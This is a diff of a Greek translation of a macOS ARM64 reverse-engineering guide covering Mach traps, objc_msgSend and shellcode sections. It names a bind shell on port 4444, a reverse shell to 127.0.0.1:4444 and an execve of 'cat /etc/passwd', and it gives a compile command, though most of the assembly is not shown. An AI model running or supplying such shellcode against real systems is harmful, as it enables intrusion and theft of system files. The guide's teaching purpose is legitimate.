+- **`AIF`**: Ορισμένες exceptions μπορούν να απενεργοποιηθούν χρησιμοποιώντας τα bits **`A`**, `I`, `F`. Αν το **`A`** είναι 1, αυτό σημαίνει ότι θα ενεργοποιούνται **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε εξωτερικά hardware **Interrupts Requests** (IRQs), ενώ το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
 
 ## macOS
 
@@ -330,9 +330,9 @@ mov r0, #8
 
 ### Mach Traps
 
-Δείτε στο [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) το `mach_trap_table` και στο [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) τα prototypes. Ο μέγιστος αριθμός των Mach traps είναι `MACH_TRAP_TABLE_COUNT` = 128. Τα Mach traps θα έχουν **x16 < 0**, επομένως πρέπει να καλέσετε τους αριθμούς από την προηγούμενη λίστα με ένα **minus**: Το **`_kernelrpc_mach_vm_allocate_trap`** είναι **`-10`**.
+Στο [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) δείτε το `mach_trap_table` και στο [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) τα prototypes. Ο μέγιστος αριθμός των Mach traps είναι `MACH_TRAP_TABLE_COUNT` = 128. Τα Mach traps θα έχουν **x16 < 0**, επομένως πρέπει να καλέσετε τους αριθμούς από την προηγούμενη λίστα με ένα **minus**: Η **`_kernelrpc_mach_vm_allocate_trap`** είναι **`-10`**.
 
-Μπορείτε επίσης να ελέγξετε το **`libsystem_kernel.dylib`** σε έναν disassembler για να βρείτε πώς καλούνται αυτά τα (και τα BSD) syscalls:
+Μπορείτε επίσης να ελέγξετε το **`libsystem_kernel.dylib`** σε έναν disassembler για να βρείτε πώς να καλέσετε αυτά τα (και τα BSD) syscalls:
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -340,32 +340,32 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-Σημειώστε ότι τα **Ida** και **Ghidra** μπορούν επίσης να κάνουν decompile σε **συγκεκριμένα dylibs** από το cache, απλώς περνώντας το cache.
+Σημειώστε ότι τα **Ida** και **Ghidra** μπορούν επίσης να κάνουν decompile **συγκεκριμένα dylibs** από το cache, απλώς περνώντας το cache.
 
 > [!TIP]
-> Μερικές φορές είναι ευκολότερο να ελέγξετε τον **decompiled** κώδικα από το **`libsystem_kernel.dylib`** **παρά** να ελέγξετε τον **source code**, επειδή ο κώδικας αρκετών syscalls (BSD και Mach) δημιουργείται μέσω scripts (δείτε τα σχόλια στον source code), ενώ στο dylib μπορείτε να βρείτε τι καλείται.
+> Μερικές φορές είναι ευκολότερο να ελέγξετε τον **decompiled** κώδικα από το **`libsystem_kernel.dylib`** **παρά** να ελέγξετε τον **source code**, επειδή ο κώδικας αρκετών syscalls (BSD και Mach) παράγεται μέσω scripts (ελέγξτε τα σχόλια στον source code), ενώ στο dylib μπορείτε να δείτε τι καλείται.
 
 ### machdep calls
 
-Το XNU υποστηρίζει έναν ακόμη τύπο calls που ονομάζονται machine dependent. Οι αριθμοί αυτών των calls εξαρτώνται από την architecture και ούτε τα calls ούτε οι αριθμοί είναι εγγυημένο ότι θα παραμείνουν σταθεροί.
+Το XNU υποστηρίζει έναν ακόμη τύπο calls που ονομάζονται machine dependent. Οι αριθμοί αυτών των calls εξαρτώνται από την architecture και ούτε τα calls ούτε οι αριθμοί τους είναι εγγυημένο ότι θα παραμείνουν σταθεροί.
 
 ### comm page
 
-Πρόκειται για μια memory page που ανήκει στον kernel και είναι mapped στο address space κάθε user process. Σκοπός της είναι να κάνει τη μετάβαση από το user mode στον kernel space ταχύτερη από τη χρήση syscalls για kernel services που χρησιμοποιούνται τόσο συχνά, ώστε αυτή η μετάβαση να ήταν πολύ inefficient.
+Αυτή είναι μια σελίδα μνήμης που ανήκει στον kernel και είναι mapped στον χώρο διευθύνσεων κάθε userspace process. Έχει σχεδιαστεί ώστε να κάνει τη μετάβαση από το user mode στον kernel space ταχύτερη από τη χρήση syscalls για kernel services που χρησιμοποιούνται τόσο συχνά, ώστε αυτή η μετάβαση να ήταν πολύ inefficent.
 
 Για παράδειγμα, το call `gettimeofdate` διαβάζει την τιμή του `timeval` απευθείας από το comm page.
 
 ### objc_msgSend
 
-Είναι πολύ συνηθισμένο να βρίσκετε αυτή τη function να χρησιμοποιείται σε προγράμματα Objective-C ή Swift. Αυτή η function επιτρέπει την κλήση μιας method ενός Objective-C object.
+Είναι πολύ συνηθισμένο να βρίσκουμε αυτή τη function σε προγράμματα Objective-C ή Swift. Αυτή η function επιτρέπει την κλήση μιας method ενός Objective-C object.
 
 Parameters ([περισσότερες πληροφορίες στα docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
 - x0: self -> Pointer στο instance
 - x1: op -> Selector της method
-- x2... -> Υπόλοιπα arguments της invoked method
+- x2... -> Τα υπόλοιπα arguments της invoked method
 
-Επομένως, αν βάλετε breakpoint πριν από το branch προς αυτή τη function, μπορείτε εύκολα να βρείτε τι γίνεται invoked στο lldb (σε αυτό το παράδειγμα, το object καλεί ένα object από το `NSConcreteTask`, το οποίο θα εκτελέσει μια command):
+Επομένως, αν βάλετε breakpoint πριν από το branch προς αυτή τη function, μπορείτε εύκολα να βρείτε τι γίνεται invoked στο lldb με (σε αυτό το παράδειγμα, το object καλεί ένα object από το `NSConcreteTask` που θα εκτελέσει μια command):
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -384,31 +384,31 @@ whoami
 )
 ```
 > [!TIP]
-> Με τον ορισμό της env variable **`NSObjCMessageLoggingEnabled=1`** είναι δυνατό να καταγραφεί πότε καλείται αυτή η function σε ένα file όπως το `/tmp/msgSends-pid`.
+> Με τη ρύθμιση της μεταβλητής περιβάλλοντος **`NSObjCMessageLoggingEnabled=1`** είναι δυνατή η καταγραφή του πότε καλείται αυτή η function σε ένα αρχείο όπως το `/tmp/msgSends-pid`.
 >
-> Επιπλέον, ορίζοντας το **`OBJC_HELP=1`** και καλώντας οποιοδήποτε binary, μπορείτε να δείτε άλλες environment variables που μπορείτε να χρησιμοποιήσετε για να κάνετε **log** όταν πραγματοποιούνται συγκεκριμένες Objc-C actions.
+> Επιπλέον, ρυθμίζοντας το **`OBJC_HELP=1`** και καλώντας οποιοδήποτε binary, μπορείτε να δείτε άλλες μεταβλητές περιβάλλοντος που μπορείτε να χρησιμοποιήσετε για να **καταγράφετε** πότε πραγματοποιούνται συγκεκριμένες ενέργειες Objc-C.
 
-Όταν καλείται αυτή η function, είναι απαραίτητο να βρεθεί η called method του υποδεικνυόμενου instance. Για αυτό πραγματοποιούνται διαφορετικές αναζητήσεις:
+Όταν καλείται αυτή η function, είναι απαραίτητο να βρεθεί η καλούμενη method του υποδεικνυόμενου instance. Για αυτό πραγματοποιούνται διαφορετικές αναζητήσεις:
 
 - Εκτέλεση optimistic cache lookup:
-- Αν είναι επιτυχής, ολοκληρώθηκε
+- Αν είναι επιτυχής, ολοκληρώνεται
 - Απόκτηση του runtimeLock (read)
 - Αν (realize && !cls->realized), realize class
 - Αν (initialize && !cls->initialized), initialize class
 - Δοκιμή του cache της ίδιας της class:
-- Αν είναι επιτυχής, ολοκληρώθηκε
+- Αν είναι επιτυχής, ολοκληρώνεται
 - Δοκιμή της method list της class:
 - Αν βρεθεί, συμπλήρωση του cache και ολοκλήρωση
 - Δοκιμή του cache της superclass:
-- Αν είναι επιτυχής, ολοκληρώθηκε
+- Αν είναι επιτυχής, ολοκληρώνεται
 - Δοκιμή της method list της superclass:
 - Αν βρεθεί, συμπλήρωση του cache και ολοκλήρωση
 - Αν (resolver), δοκιμή του method resolver και επανάληψη από το class lookup
-- Αν βρισκόμαστε ακόμη εδώ (= όλα τα υπόλοιπα απέτυχαν), δοκιμή του forwarder
+- Αν βρισκόμαστε ακόμη εδώ (= όλα τα υπόλοιπα έχουν αποτύχει), δοκιμή του forwarder
 
 ### Shellcodes
 
-Για compilation:
+Για μεταγλώττιση:
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -482,7 +482,7 @@ return 0;
 
 #### Shell
 
-Αντλήθηκε από [**εδώ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) και επεξηγείται.<sup>[1]</sup>
+Taken from [**εδώ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) and explained.<sup>[[1]](#references)</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -554,7 +554,7 @@ sh_path: .asciz "/bin/sh"
 
 #### Ανάγνωση με cat
 
-Ο στόχος είναι να εκτελεστεί το `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, επομένως το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (ο οποίος στη μνήμη αντιστοιχεί σε μια στοίβα διευθύνσεων).
+Ο στόχος είναι να εκτελέσουμε `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, επομένως το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (ο οποίος στη μνήμη αντιστοιχεί σε μια στοίβα διευθύνσεων).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -626,7 +626,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-Bind shell από το [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) στη **θύρα 4444**<sup>[2]</sup>.
+Bind shell από [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) στη **θύρα 4444**<sup>[[2]](#references)</sup>
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -710,7 +710,7 @@ svc  #0x1337
 ```
 #### Reverse shell
 
-Από το [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell στο **127.0.0.1:4444**<sup>[3]</sup>.
+Από [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell στο **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
 ```armasm
 .section __TEXT,__text
 .global _main
